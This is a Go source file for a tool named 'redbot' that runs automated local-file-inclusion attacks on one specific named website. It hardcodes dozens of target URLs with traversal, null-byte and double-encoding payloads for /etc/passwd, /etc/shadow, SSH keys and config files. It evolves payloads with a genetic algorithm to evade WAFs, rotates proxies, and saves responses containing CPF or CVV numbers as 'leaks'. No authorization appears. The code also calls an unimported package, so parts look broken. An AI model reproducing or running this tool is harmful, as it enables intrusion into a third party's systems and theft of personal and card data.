// main_fallback_integrado.go
package main

import (
	"bufio"
	"bytes"
	"crypto/rand"
	"encoding/binary"
	"encoding/csv"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"runtime"
	"strings"
	"context" 
	"sync"
	"time"

	mathrand "math/rand"

	"github.com/schollz/progressbar/v3"
	"github.com/spf13/cobra"

	"lfitessla/headers"
	"lfitessla/injector"
	"lfitessla/mutador"
	"lfitessla/proxy"
	"lfitessla/strategies"
)



// RLState representa um estado para tabela de recompensa
type RLState struct {
	Payload string `json:"payload"`
	WAF     string `json:"waf"`
	Canal   string `json:"canal"`
}

// EvolutionStats coleta métricas por geração
type EvolutionStats struct {
	Generation   int     `json:"generation"`
	MaxFitness   int     `json:"max_fitness"`
	AvgFitness   float64 `json:"avg_fitness"`
	EntropyDelta float64 `json:"entropy_delta"`
	BestPayload  string  `json:"best_payload"`
}

// Alvo representa endpoint alvo de LFI/RFI/etc.
type Alvo struct {
	URL    string
	Method string
	Body   string // para POSTs
}

var (
	// CLI flags
	cfgThreads  int
	cfgGens     int
	cfgPopSize  int
	cfgSaveSVG  bool
	cfgSaveCSV  bool
	cfgChannels []string
	cfgOutputDir string
	cfgNoBrowser bool
	cfgDashboard bool

	// tabelas de RL
	rlTable = make(map[RLState]float64)
	rlMu    sync.Mutex
	statsAll = struct {
		sync.Mutex
		Data map[string][]EvolutionStats
	}{Data: make(map[string][]EvolutionStats)}

	// regex de detecção de vazamento
    // regex de detecção de vazamento
    regexSensivel = []*regexp.Regexp{
        regexp.MustCompile(`(?i)cpf[:=]\s*\d{3}\.\d{3}\.\d{3}-\d{2}`),
        regexp.MustCompile(`(?i)cvv[:=]?\s*\d{3}`),
    }
) // <— fecha o var(…)
    


	// alvos básicos
	// alvos básicos (expandido)
     var alvosBase = []Alvo{
	// Endpoints gerais com parâmetros comuns de LFI
	{"https://app.pixswap.trade/index.php?page=", "GET", ""},
	{"https://app.pixswap.trade/beta/index.php?file=", "GET", ""},
	{"https://app.pixswap.trade/beta/download.php?file=", "GET", ""},
	{"https://app.pixswap.trade/beta/view.php?doc=", "GET", ""},
	{"https://app.pixswap.trade/beta/template.php?path=", "GET", ""},

	// Subdiretórios comuns e uploads
	{"https://app.pixswap.trade/beta/uploads/file=", "GET", ""},
	{"https://app.pixswap.trade/beta/admin/config.php?file=", "GET", ""},
	{"https://app.pixswap.trade/beta/assets/data.php?file=", "GET", ""},
	{"https://app.pixswap.trade/beta/include/template.php?path=", "GET", ""},

	// Diretórios sensíveis típicos para LFI
	{"https://app.pixswap.trade/beta/var/www/html/index.php?file=", "GET", ""},
	{"https://app.pixswap.trade/beta/etc/passwd?file=", "GET", ""},
	{"https://app.pixswap.trade/beta/home/user/config.php?path=", "GET", ""},
	{"https://app.pixswap.trade/beta/root/.ssh/id_rsa?file=", "GET", ""},

	// Novos alvos com bypasses (path traversal, null byte, etc.)
	{"https://app.pixswap.trade/beta/painel.php?page=../../../../../etc/passwd", "GET", ""},
	{"https://app.pixswap.trade/beta/painel.php?page=%252e%252e%252f%252e%252e%252fetc%252fpasswd", "GET", ""},
	{"https://app.pixswap.trade/beta/painel.php?page=../../../../../etc/passwd%00", "GET", ""},
	{"https://app.pixswap.trade/beta/index.php?file=../../../../../etc/shadow%00", "GET", ""},
	{"https://app.pixswap.trade/beta/viewer.php?file=../../../../../var/log/auth.log", "GET", ""},
	{"https://app.pixswap.trade/beta/viewer.php?file=../../../../../var/log/auth.log%00", "GET", ""},
	{"https://app.pixswap.trade/beta/admin.php?include=../../../../../../proc/self/environ", "GET", ""},
	{"https://app.pixswap.trade/beta/admin.php?include=../../../../../../proc/self/environ%00", "GET", ""},
	{"https://app.pixswap.trade/beta/dashboard.php?path=....//....//etc/passwd", "GET", ""},
	{"https://app.pixswap.trade/beta/dashboard.php?path=..%5C..%5Cetc%5Cpasswd", "GET", ""},
	{"https://app.pixswap.trade/beta/admin/config.php?config=../../../etc/passwd", "GET", ""},
	{"https://app.pixswap.trade/beta/settings.php?file=../../../../../etc/passwd", "GET", ""},
	{"https://app.pixswap.trade/beta/settings.php?file=../../../../../etc/passwd%00", "GET", ""},
	{"https://app.pixswap.trade/beta/download.php?file=../../../../../../var/log/apache2/access.log", "GET", ""},
	{"https://app.pixswap.trade/beta/download.php?file=../../../../../../var/log/apache2/access.log%00", "GET", ""},
	{"https://app.pixswap.trade/beta/wp-content/plugins/vulnerable-plugin/include.php?file=../../../../../../wp-config.php", "GET", ""},
	{"https://app.pixswap.trade/beta/index.php?option=com_webtv&controller=../../../../../../etc/passwd%00", "GET", ""},
	{"https://app.pixswap.trade/beta/index.php?option=com_config&view=../../../../../../configuration.php", "GET", ""},
	{"https://app.pixswap.trade/beta/index.php?file=../../../../../home/admin/.ssh/authorized_keys", "GET", ""},
	{"https://app.pixswap.trade/beta/portal.php?page=../../../../../../etc/issue", "GET", ""},
	{"https://app.pixswap.trade/beta/portal.php?page=../../../../../../etc/hostname", "GET", ""},
	{"https://app.pixswap.trade/beta/portal.php?page=../../../../../../var/www/html/index.php", "GET", ""},

	// Tentativas de outros métodos HTTP
	{"https://app.pixswap.trade/beta/api/upload.php", "POST", ""},
	{"https://app.pixswap.trade/beta/api/delete.php", "DELETE", ""},
	{"https://app.pixswap.trade/beta/api/update.php?file=", "PUT", ""},

	// Outras extensões e arquivos
	{"https://app.pixswap.trade/beta/index.jsp?file=", "GET", ""},
	{"https://app.pixswap.trade/beta/include/config.pl?path=", "GET", ""},
	{"https://app.pixswap.trade/beta/admin/config.asp?file=", "GET", ""},
}


func main() {
	rootCmd := &cobra.Command{
		Use:   "redbot",
		Short: "Red Team Autônomo Avançado",
		Run:   run,
	}

	rootCmd.Flags().IntVarP(&cfgThreads, "threads", "t", 20, "concurrent threads")
	rootCmd.Flags().IntVarP(&cfgGens, "gens", "g", 8, "GA generations")
	rootCmd.Flags().IntVarP(&cfgPopSize, "pop", "p", 10, "GA population size")
	rootCmd.Flags().BoolVar(&cfgSaveSVG, "save-svg", false, "save entropy SVG for elites")
	rootCmd.Flags().BoolVar(&cfgSaveCSV, "save-csv", false, "save CSV stats per attack")
	rootCmd.Flags().StringSliceVar(&cfgChannels, "channels", []string{"url", "header", "cookie", "json", "xml"}, "injection channels: url,header,cookie,json,xml")
	rootCmd.Flags().StringVarP(&cfgOutputDir, "output", "o", "./output", "output base directory")
	rootCmd.Flags().BoolVar(&cfgNoBrowser, "no-browser", false, "no automatic dashboard browser launch")
	rootCmd.Flags().BoolVar(&cfgDashboard, "dashboard", true, "generate dashboard JSON + HTML")

	if err := rootCmd.Execute(); err != nil {
		fmt.Println(err)
		os.Exit(1)
	}
}

func run(cmd *cobra.Command, args []string) {
	// seed math/rand
	var seed int64
	_ = binary.Read(rand.Reader, binary.LittleEndian, &seed)
	mathrand.Seed(seed)

	// criar pastas
	os.MkdirAll(filepath.Join(cfgOutputDir, "vazamentos"), 0755)
	if cfgSaveSVG {
		os.MkdirAll(filepath.Join(cfgOutputDir, "svg_debug"), 0755)
	}
	if cfgSaveCSV {
		os.MkdirAll(filepath.Join(cfgOutputDir, "stats_csv"), 0755)
	}

	// carregar payloads
// … dentro de func run(…)
   payloadFile := filepath.Join(
        `C:\Users\Paulo\Desktop\lfi-tessla-pro`,
        "backend", "python", "ia_payload_gen", "payloads",
        "payloads_gerados.txt",
    )
    fmt.Println("↪ Carregando payloads de:", payloadFile)

    // diagnóstico opcional: liste o que há nessa pasta
    dir := filepath.Dir(payloadFile)
    fmt.Println("⤷ Diretório onde procuro payloads:", dir)
    if entries, err2 := os.ReadDir(dir); err2 == nil {
        fmt.Println("⤷ Arquivos neste diretório:")
        for _, e := range entries {
            fmt.Println("    ", e.Name())
        }
    }

    // agora abra de verdade
    payloads, err := carregarPayloads(payloadFile)
    if err != nil {
        fmt.Println("❌ Carregar payloads:", err)
        return
    }

	// loop de ataques
	total := len(alvosBase) * len(payloads)
	bar := progressbar.NewOptions(total, progressbar.OptionSetPredictTime(false))
	sem := make(chan struct{}, cfgThreads)
	var wg sync.WaitGroup

	for _, alvo := range alvosBase {
		for _, p := range payloads {
			wg.Add(1)
			sem <- struct{}{}
			go func(a Alvo, basePayload string) {
				defer wg.Done()
				executarAtaque(a, basePayload)
				<-sem
				bar.Add(1)
			}(alvo, p)
		}
	}
	wg.Wait()
	fmt.Println("✅ Ataques finalizados.")
	exportResults()

	if cfgDashboard && !cfgNoBrowser {
		openBrowser(filepath.Join(cfgOutputDir, "dashboard.html"))
	}
}

func carregarPayloads(path string) ([]string, error) {
	f, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer f.Close()
	var list []string
	scanner := bufio.NewScanner(f)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" && !strings.HasPrefix(line, "---") {
			list = append(list, line)
		}
	}
	return list, scanner.Err()
}

func tryInject(url, payload, canal string) error {
    var err error
    switch canal {
    case "url", "header", "cookie", "json":
        err = utlslocal.InjectPayload(url, payload)
    case "xml":
        err = injectXMLPayload(url, payload)
    default:
        return fmt.Errorf("canal desconhecido: %s", canal)
    }
    if err != nil {
        fmt.Printf("Erro ao injetar (%s): %v\n", canal, err)
    }
    return err
}

func executarAtaque(alvo Alvo, basePayload string) {
    attackID := fmt.Sprintf("%s|%s", alvo.URL, basePayload)

    // 1) Inicial com entropia-target
    initPop := mutador.MutarParaEntropiaTarget(basePayload, 6.5)
    if len(initPop) == 0 {
        initPop = mutador.MutarPayload(basePayload)
    }

    // 2) GA loop
    finalPop, stats := runGAWithStats(initPop, cfgGens, cfgPopSize)

    // Armazenar stats
    statsAll.Lock()
    statsAll.Data[attackID] = stats
    statsAll.Unlock()

    // opcional CSV
    if cfgSaveCSV {
        saveCSVStats(attackID, stats)
    }

    // 3) Multi-Channel Injection com cancelamento no primeiro sucesso
    ctx, cancel := context.WithCancel(context.Background())
    defer cancel()

    success := make(chan struct{})
    go func() {
        for _, elite := range finalPop {
            for _, canal := range cfgChannels {
                select {
                case <-ctx.Done():
                    return
                default:
                }
                if tryInject(alvo.URL, elite.Payload, canal) == nil {
                    // sucesso: notifica e cancela
                    close(success)
                    cancel()
                    return
                }
            }
        }
        // nenhuma injeção teve sucesso
        close(success)
    }()

    // espera o término das tentativas
    <-success

    // se o contexto foi cancelado por sucesso, retorna imediatamente
    if ctx.Err() != nil {
        fmt.Println("✅ Ataque bem-sucedido em modo multi-canal:", attackID)
        return
    }

    // 4) Fallback mutações simples
    executarFallback(alvo, basePayload)
}

func injectXMLPayload(url, payload string) error {
	xmlPayload := fmt.Sprintf("<root>%s</root>", payload) // Envolve o payload em um elemento raiz básico
	req, err := http.NewRequest("POST", url, bytes.NewBuffer([]byte(xmlPayload)))
	if err != nil {
		return fmt.Errorf("erro ao criar requisição XML: %w", err)
	}
	req.Header.Set("Content-Type", "application/xml")
	for k, v := range headers.GerarHeadersRealistas() {
		req.Header[k] = v
	}

	proxySel, client, err := strategies.EscolherTransport("", "")
	if err != nil {
		return fmt.Errorf("erro ao escolher transporte para XML: %w", err)
	}

	resp, err := client.Do(req)
	if err != nil {
		proxy.MarcarFalha(proxySel)
		return fmt.Errorf("erro ao enviar requisição XML: %w", err)
	}
	defer resp.Body.Close()

	bodyBytes, _ := io.ReadAll(resp.Body)
	body := string(bodyBytes)

	if containsLeak(body) {
		salvarResposta(payload, url, body)
		rlMu.Lock()
		rlTable[RLState{Payload: payload, WAF: "", Canal: "xml"}] += 0.7 // Recompensa maior por sucesso em XML
		rlMu.Unlock()
	}
	return nil
}

func executarFallback(alvo Alvo, basePayload string) {
	for _, m := range mutador.MutarPayload(basePayload) {
		req, _ := http.NewRequest(alvo.Method, alvo.URL+m, strings.NewReader(alvo.Body))
		for k, v := range headers.GerarHeadersRealistas() {
			req.Header[k] = v
		}

		proxySel, client, err := strategies.EscolherTransport("", "")
		if err != nil {
			continue
		}

		resp, err2 := client.Do(req)
		if err2 != nil {
			proxy.MarcarFalha(proxySel)
			continue
		}

		bodyBytes, _ := io.ReadAll(resp.Body)
		resp.Body.Close()
		body := string(bodyBytes)

		if containsLeak(body) {
			salvarResposta(m, alvo.URL, body)
			rlMu.Lock()
			rlTable[RLState{Payload: m, WAF: "", Canal: "fallback"}] += 0.5
			rlMu.Unlock()
			return
		}
	}
}

func runGAWithStats(initial []string, generations, popSize int) ([]mutador.GenePayload, []EvolutionStats) {
	pop := make([]mutador.GenePayload, len(initial))
	for i, p := range initial {
		pop[i] = mutador.GenePayload{Payload: p}
		pop[i].Fitness = mutador.AvaliarFitness(pop[i])
		pop[i].Profile = mutador.AnalyzeProfile(pop[i])
		pop[i].Mutations = []string{"init"}
	}

	var stats []EvolutionStats
	prevEnt := 0.0

	for gen := 0; gen < generations; gen++ {
		var offs []mutador.GenePayload
		for i := 0; i < popSize; i++ {
			a := pop[mathrand.Intn(len(pop))]
			b := pop[mathrand.Intn(len(pop))]
			child := mutador.Crossover(a, b)
			child.Mutations = append(child.Mutations, "crossover")
			if mathrand.Float64() < 0.5 {
				child = mutador.MutateGene(child)
				child.Mutations = append(child.Mutations, "mutate-gene")
			} else {
				child = mutador.MutateInMaxEntropyWindow(child, 16)
				child.Mutations = append(child.Mutations, "mutate-window")
			}
			if mathrand.Float64() < 0.3 {
				child = mutador.MutarEncodeEntropyAware(child)
				child.Mutations = append(child.Mutations, "encode-entropy")
			}
			child.Fitness = mutador.AvaliarFitness(child)
			child.Profile = mutador.AnalyzeProfile(child)
			offs = append(offs, child)
		}
		pop = append(pop, offs...)
		pop = mutador.BatchAnalyzeFitness(pop)
		pop = mutador.SelecionarPayloads(pop, popSize)

		// estatísticas
		maxF, sumF, sumE := pop[0].Fitness, 0, 0.0
		for _, ind := range pop {
			sumF += ind.Fitness
			sumE += ind.Profile.Shannon
			if ind.Fitness > maxF {
				maxF = ind.Fitness
			}
		}
		avgF := float64(sumF) / float64(len(pop))
		avgE := sumE / float64(len(pop))
		delta := avgE - prevEnt
		prevEnt = avgE

		stats = append(stats, EvolutionStats{
			Generation:   gen,
			MaxFitness:   maxF,
			AvgFitness:   avgF,
			EntropyDelta: delta,
			BestPayload:  pop[0].Payload,
		})
	}

	return pop, stats
}

func containsLeak(body string) bool {
	for _, re := range regexSensivel {
		if re.MatchString(body) {
			return true
		}
	}
	return false
}

func salvarResposta(payload, base, body string) {
	ts := time.Now().Format("2006-01-02_15-04-05")
	safe := safeFilename(payload)
	parts := strings.SplitN(base, "?", 2)
	name := "root"
	if len(parts) == 2 {
		name = parts[1]
	}
	fn := filepath.Join(cfgOutputDir, "vazamentos",
		fmt.Sprintf("resp_%s__%s__%s.txt", name, safe, ts))
	os.WriteFile(fn, []byte(body), 0644)
}

func safeFilename(s string) string {
	return strings.NewReplacer(
		"/", "_", "%", "_", "?", "_", "&", "_", "=", "_",
	).Replace(s)
}

func saveCSVStats(attackID string, stats []EvolutionStats) {
	file := filepath.Join(cfgOutputDir, "stats_csv", safeFilename(attackID)+".csv")
	f, err := os.Create(file)
	if err != nil {
		return
	}
	defer f.Close()
	w := csv.NewWriter(f)
	w.Write([]string{"gen", "max_fitness", "avg_fitness", "entropy_delta", "best_payload"})
	for _, s := range stats {
		w.Write([]string{
			fmt.Sprint(s.Generation),
			fmt.Sprint(s.MaxFitness),
			fmt.Sprintf("%.2f", s.AvgFitness),
			fmt.Sprintf("%.4f", s.EntropyDelta),
			s.BestPayload,
		})
	}
	w.Flush()
}

func exportResults() {
	// RL rewards
	if data, err := json.MarshalIndent(rlTable, "", "  "); err == nil {
		os.WriteFile(filepath.Join(cfgOutputDir, "rl_rewards.json"), data, 0644)
	}
	// Evolution stats
	statsAll.Lock()
	if data, err := json.MarshalIndent(statsAll.Data, "", "  "); err == nil {
		os.WriteFile(filepath.Join(cfgOutputDir, "evolution_stats.json"), data, 0644)
	}
	statsAll.Unlock()

	// Dashboard básico (HTML + Chart.js)
	if cfgDashboard {
		generateDashboard(cfgOutputDir)
	}
}

func generateDashboard(outDir string) {
	html := `
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>Dashboard RedBot</title>
<script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
</head>
<body>
<h1>Evolution Stats</h1>
<canvas id="evoChart" width="800" height="400"></canvas>
<script>
fetch('evolution_stats.json').
then(r=>r.json()).then(data=>{
	const ctx = document.getElementById('evoChart').getContext('2d');
	const labels = Object.keys(data);
	const datasets = [];

	for (const attackId in data) {
		const stats = data[attackId];
		const maxFitnessData = stats.map(s => s.MaxFitness);
		const avgFitnessData = stats.map(s => s.AvgFitness);
		const entropyDeltaData = stats.map(s => s.EntropyDelta);

		datasets.push({
			label: attackId + ' (Max Fitness)',
			data: maxFitnessData,
			borderColor: '#' + Math.floor(Math.random()*16777215).toString(16),
			fill: false,
			yAxisID: 'y-fitness'
		});
		datasets.push({
			label: attackId + ' (Avg Fitness)',
			data: avgFitnessData,
			borderColor: '#' + Math.floor(Math.random()*16777215).toString(16),
			fill: false,
			yAxisID: 'y-fitness',
			borderDash: [5, 5]
		});
		datasets.push({
			label: attackId + ' (Entropy Delta)',
			data: entropyDeltaData,
			borderColor: '#' + Math.floor(Math.random()*16777215).toString(16),
			fill: false,
			yAxisID: 'y-entropy'
		});
	}

	new Chart(ctx, {
		type: 'line',
		data: {
			labels: data[Object.keys(data)[0]].map(s => 'Gen ' + s.Generation),
			datasets: datasets
		},
		options: {
			scales: {
				'y-fitness': {
					type: 'linear',
					position: 'left',
					title: {
						display: true,
						text: 'Fitness'
					}
				},
				'y-entropy': {
					type: 'linear',
					position: 'right',
					title: {
						display: true,
						text: 'Entropy Delta'
					},
					grid: {
						drawOnChartArea: false,
					},
				},
			},
			plugins: {
				title: {
					display: true,
					text: 'Evolução do Fitness e Delta de Entropia por Ataque'
				}
			}
		}
	});
});
</script>
</body>
</html>
`
	os.WriteFile(filepath.Join(outDir, "dashboard.html"), []byte(html), 0644)
}

func openBrowser(path string) {
	var cmd *exec.Cmd
	switch runtime.GOOS {
	case "windows":
		cmd = exec.Command("cmd", "/c", "start", path)
	case "darwin":
		cmd = exec.Command("open", path)
	default:
		cmd = exec.Command("xdg-open", path)
	}
	_ = cmd.Start()
}